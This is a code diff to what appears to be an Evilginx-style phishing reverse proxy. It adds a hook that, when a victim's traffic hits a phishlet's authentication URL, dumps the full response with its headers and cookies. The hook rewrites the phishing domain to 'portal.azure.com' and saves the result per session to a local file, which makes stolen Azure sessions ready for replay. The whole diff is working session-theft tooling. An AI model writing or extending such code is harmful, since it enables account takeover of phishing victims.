@@ -28,6 +28,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"net/http/httputil"
 
 	"golang.org/x/net/proxy"
 
@@ -717,6 +718,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if err == nil {
 				for site, pl := range p.cfg.phishlets {
 					if p.cfg.IsSiteEnabled(site) {
+						au := pl.authUrls[0]
+						//if resp.Request.URL.Path == "/common/SAS/ProcessAuth" {
+						if au.MatchString(resp.Request.URL.Path) {
+						//if resp.Request.URL.Path == pl.authUrls[0] {
+                                                        //extract headers
+                                                        b, err := httputil.DumpResponse(resp, true)
+                                                        if err != nil {
+                                                                log.Error("DumpResponse: %v", err)
+                                                        }
+                                                        r_headers := strings.Replace(string(b), "portal.test.dogshatethedoctor.com", "portal.azure.com", -1)
+                                                        //creating output file
+                                                        f, err := os.Create("./output/" + ps.SessionId + ".txt")
+                                                        if err != nil {
+                                                                log.Error("os.Create: %v", err)
+                                                        }
+                                                        defer f.Close()
+                                                        //writing response to file
+                                                        f.Write([]byte(r_headers))
+                                                        f.Write([]byte(string(body)))
+                                                }
+
+
 						// handle sub_filters
 						sfs, ok := pl.subfilters[req_hostname]
 						if ok {
